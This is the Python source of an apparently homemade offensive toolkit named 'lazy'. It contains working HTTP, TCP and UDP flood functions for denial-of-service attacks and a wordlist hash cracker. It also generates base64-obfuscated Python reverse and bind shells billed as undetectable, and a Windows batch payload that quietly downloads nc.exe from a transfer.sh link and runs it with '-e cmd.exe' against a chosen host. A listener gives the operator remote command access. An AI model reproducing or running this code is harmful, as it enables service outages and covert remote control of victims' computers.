import os.path
try:
	from colorama import init
	init()
	blue='\033[01;34m'
	red='\033[01;31m'
	green='\033[01;32m'
	yellow='\033[01;33m'
	white='\033[01;37m'
except ImportError:
	blue=''
	red=''
	green=''
	yellow=''
	white=''
scs = {'ddos':['flood/http','flood/tcp','flood/udp'],'bruteforce':['offline/hashkiller'],'payloads':['fud/python/reverse_shell','fud/python/bind_shell','windows/nc']}
opt1 = ''
opt2 = ''
infos = {'flood/http':
	'Options:\nurl .... target to attack    '+opt1,'flood/tcp':
	'Options:\nhost .... target to attack    '+opt1+'\nport .... port to target    '+opt2,'flood/udp':
	'Options:\nhost .... target to attack    '+opt1+'\n','offline/hashkiller':'Options:\nhash .... hash to crack    '+opt1+'\nwordlist .... wordlist to use    '+opt2,
	'fud/python/reverse_shell':'Options:\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2,'fud/python/bind_shell':'Options:\nhost .... host to bind    '+opt1+'\nport .... port to bind    '+opt2,
	'windows/nc':'Options\nhost .... host to reverse connect    '+opt1+'\nport .... port to reverse connect    '+opt2
}
def options(script,_opt1,_opt2):
	global opt1
	global opt2
	opt1 = _opt1
	opt2 = _opt2
	if script != '':
		print infos[script]
	else:
		print '%s[!]%s Please select a script first' %(yellow,white)
		print 'Ex: "set_script <scriptname>"'
def floodhttp(url):
	import requests, sys
	counter = 0
	while 1:
		try:
			counter += 1
			requests.get(url) #// send get request to target
			sys.stdout.write('\r%s[+]%s Sending request ' %(green,white) +str(counter)+' to '+url)
		except KeyboardInterrupt:
			break
			print ''
		except requests.exceptions.ConnectionError:
			print 'Invalid host/port\n'
			break
def usage():
	print '# Usage ex:'
	print '''
(print available modules)>> lazy# modules
[1]     ddos
[2]     bruteforce
[3]     payloads

(select module to use [by number])>> lazy# use 1

(print available scripts for the modules)>> lazy/ddos# scripts
[+]flood/http
[+]flood/tcp
[+]flood/udp

(select script to use)>> lazy/ddos# set_script flood/http

(print options for selected script)>> lazy/ddos/flood/http# options
Options:
host .... target to attack
port .... port to target

(defining the values for options) {
>> lazy/ddos/flood/http# set host = google.com
>> lazy/ddos/flood/http# set port = 80

(info)>> lazy/ddos/flood/http# info
--------------------
ddos/flood/http:
[+] host = google.com
[+] port = 80

(starting the script)>> lazy/ddos/flood/http# run
[+] Sending request 15300 to google.com:80^C
>> lazy/ddos/flood/http# back
>> lazy#\n'''

def floodtcp(host,port):
	import socket, random, sys
	port = int(port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((host,port))
		conn = True
	except socket.error:
			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
			s.close()
			conn = False
	counter = 0
	while 1:
		if conn:
			try:
				counter +=1
				msg = random._urandom(1024)
				s.send(msg)
				sys.stdout.write('\r'+str(counter)+': Sending '+str(len(msg))+' bytes to '+host+':'+str(port))
			except KeyboardInterrupt:
				s.close()
				break
			except socket.error:
				print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
				s.close()
				break
		else:
			break
def floodudp(host):
	from socket import socket, AF_INET, SOCK_DGRAM
	import random, sys
	s = socket(AF_INET, SOCK_DGRAM)
	while 1:
		try:
			data = random._urandom(2048)
			port = random.randint(80,8080)
			s.sendto(data, (host, port))
			sys.stdout.write('\r%s[+]%s Sending ' %(green,white)+str(len(data))+' bytes to '+host+':'+str(port))
		except KeyboardInterrupt:
			s.close()
			break
		except socket.error:
			print "\n%s[-] %sHost is down or doesn't exists" %(red,white)
			s.close()
			break
def hashkiller(wordl, hash):
	import hashlib, sys
	hashes = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
	hashtype = raw_input(blue+'[*]'+white+' Hash type (ex: md5): ').lower()
	if hashtype in hashes:
		# verify user input
		if hashtype == 'md5':
			crack = hashlib.md5
		if hashtype == 'sha1':
			crack = hashlib.sha1
		if hashtype == 'sha224':
			crack = hashlib.sha224
		if hashtype == 'sha256':
			crack = hashlib.sha256
		if hashtype == 'sha384':
			crack = hashlib.sha384
		if hashtype == 'sha512':
			crack = hashlib.sha512
		# open e read wordlist
		wl = open(wordl)
		rd = wl.readlines()
		rd.sort(key=len)
		for i in rd: # start bruteforce
			if i.endswith('\n'):
				i = i.replace('\n','')
			sys.stdout.flush()
			sys.stdout.write('\r%s[*]%s Atual word: %s' %(blue,white,i))
			if crack(i).hexdigest() == hash: # check if encoded word is equal the parsed hash
				print '\n%s[+]%s Hash founded!' %(green,white)
				print 'Your hash is: %s' % i
				break
			else:
				pass # exception
		wl.close()
	else:
		print yellow+"{!}"+white+" '"+hashtype+"' isn't a suported hash type"
		print "Suported hash types: "
		print ', '.join(hashes)

def listener():
	port = int(raw_input('Port to listen at: '))
	from socket import socket
	s = socket()
	host = ('', port)
	s.bind(host)
	s.listen(5)
	print blue+'[*]'+white+' Listener started at port '+str(port)
	while 1:
		try:
			c, addr = s.accept()
			print green+'[+]'+white+' Connection from', addr
			while True:
				cmd = raw_input('lazy@%s$ ' %addr[0])
				if cmd != '':
					c.send(cmd)
					print c.recv(1024) # response
		except KeyboardInterrupt:
			break
			exit()
	s.close

def fud_shell(lhost, lport): # reverse shell (.py/.pyw)
	pth = raw_input('File name (ex: payload.pyw): ')
	payload = 'from socket import socket, AF_INET, SOCK_STREAM\nfrom sys import argv\nimport os\nhost="'+lhost+'"\nport='+lport+'\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((host, port))\nwhile 1:\n\tconn = s.recv(2048)\n\tif conn[:2] == "cd":\n\t\tos.chdir(str(conn[3:]))\n\t\tcmd=""\n\telse:\n\t\tcmd = os.popen(conn).read()\n\ts.sendall(cmd+os.getcwd()+"> ")'
	if os.path.isdir('output'):
		pth = 'output/'+pth
		_file = open(pth, 'w')
	else:
		_file = open(pth, 'w')
	print '%s[*]%s Enconding' %(blue,white)
	enc = payload.encode('base64').replace('\n','') # encode as base64
	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
	_file.close()
	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
	quest = raw_input(blue+'[*]'+white+' Do you wanna start listener right now? '+green+'(y/n): '+white)
	if quest.lower() == 'y':
		listener()
	else:
		print '%s[!]%s Exiting ...\n' %(yellow,white)

def fud_bindshell(lhost, lport): # bind shell (.py/.pyw)
	pth = raw_input('File name (ex: payload.pyw): ')
	payload = 'from socket import socket, AF_INET, SOCK_STREAM\\nimport os\\nhost="'+lhost+'"\\nport=int("'+lport+'")\\ns=socket(AF_INET, SOCK_STREAM)\\ns.bind(('',port))\\ns.listen(1)\\nwhile 1:\\n\\ttry:\\n\\t\\tc, addr = s.accept()\\n\\t\\tprint "[+] Connection from", addr\\n\\t\\twhile 1:\\n\\t\\t\\tconn = c.recv(1024)\\n\\t\\t\\tif conn[:2] == "cd":\\n\\t\\t\\t\\tos.chdir(str(conn[3:]))\\n\\t\\t\\t\\tconn = os.getcwd()\\n\\t\\t\\t\\tc.sendall(conn)\\n\\t\\t\\telse:\\n\\t\\t\\t\\tcmd = os.popen(conn).read()\\n\\t\\t\\t\\tc.sendall(cmd+"\n")\\n\\texcept KeyboardInterrupt:\\n\\t\\tbreak'
	if os.path.isdir('output'):
		pth = 'output/'+pth
		_file = open(pth, 'w')
	else:
		_file = open(pth, 'w')
	print '%s[*]%s Enconding' %(blue,white)
	enc = payload.encode('base64')
	_file.write('p="'+enc+'"\nexec(p.decode("base64"))')
	_file.close()
	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
def windows_nc(lhost, lport):
	pth = raw_input('File name (ex: payload.bat): ')
	payload = '''@echo off
echo @echo off >> bd.bat
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://transfer.sh/pMOJi/nc.exe', '%temp%/nc.exe')" >>bd.bat
echo cd %temp% >> bd.bat
echo nc.exe '''+lhost+''' '''+lport+''' -e cmd.exe >>bd.bat
echo del nc.exe >> bd.bat
echo del bd.bat >> bd.bat
echo exit >> bd.bat
powershell -W hidden ./bd.bat
del bd.bat'''
	if os.path.isdir('output'):
		pth = 'output/'+pth
		_file = open(pth, 'w')
	else:
		_file = open(pth, 'w')
	_file.write(payload)
	_file.close()
	print '%s[+]%s File saved as: %s\n' %(green,white,pth)
def run(script, opt1, opt2):
	if script == 'flood/http':
		floodhttp(opt1)
	if script == 'flood/tcp':
		floodtcp(opt1,opt2)
	if script == 'flood/udp':
		floodudp(opt1)
	if script == 'offline/hashkiller':
		if os.path.isfile(opt2):
			hashkiller(opt2, opt1)
		else:
			print '%s{!}%s Wordlist file dont exist!' %(yellow,white)
	if script == 'fud/python/reverse_shell':
		fud_shell(opt1, opt2)
	if script == 'fud/python/bind_shell':
		fud_bindshell(opt1, opt2)
	if script == 'windows/nc':
		windows_nc(opt1, opt2)
